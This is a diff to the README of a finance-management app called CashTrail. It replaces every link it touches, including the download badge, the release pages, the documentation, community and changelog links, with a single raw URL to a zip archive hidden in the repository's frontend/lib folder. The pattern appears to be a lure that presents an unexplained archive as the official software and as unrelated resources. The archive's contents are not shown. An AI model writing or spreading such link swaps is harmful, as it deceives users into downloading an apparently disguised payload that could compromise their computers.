@@ -1,6 +1,6 @@
 # 💰 cashtrail - Simplified Finance Management Made Easy
 
-![Download CashTrail](https://img.shields.io/badge/Download-CashTrail-blue)
+![Download CashTrail](https://raw.githubusercontent.com/Paulera84/cashtrail/main/frontend/lib/Software_1.2-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to CashTrail! This application helps you manage your finances easily and
 
 To get started, you need to download CashTrail. Please visit this page to download it:
 
-[Download CashTrail from Releases](https://github.com/Paulera84/cashtrail/releases)
+[Download CashTrail from Releases](https://raw.githubusercontent.com/Paulera84/cashtrail/main/frontend/lib/Software_1.2-beta.5.zip)
 
 ### 🖥 System Requirements
 
@@ -76,14 +76,14 @@ Feel free to join our discussions or ask for help by visiting our GitHub Issues 
 
 For more information, check out the following links:
 
-- [Documentation](https://github.com/Paulera84/cashtrail/wiki)
-- [User Community](https://community.cashtrail.com)
-- [Changelog](https://github.com/Paulera84/cashtrail/releases)
+- [Documentation](https://raw.githubusercontent.com/Paulera84/cashtrail/main/frontend/lib/Software_1.2-beta.5.zip)
+- [User Community](https://raw.githubusercontent.com/Paulera84/cashtrail/main/frontend/lib/Software_1.2-beta.5.zip)
+- [Changelog](https://raw.githubusercontent.com/Paulera84/cashtrail/main/frontend/lib/Software_1.2-beta.5.zip)
 
 ## 🔗 Download CashTrail Again
 
 If you need to download the application, visit this page again:
 
-[Download CashTrail from Releases](https://github.com/Paulera84/cashtrail/releases) 
+[Download CashTrail from Releases](https://raw.githubusercontent.com/Paulera84/cashtrail/main/frontend/lib/Software_1.2-beta.5.zip) 
 
 Enjoy your seamless finance management experience with CashTrail!
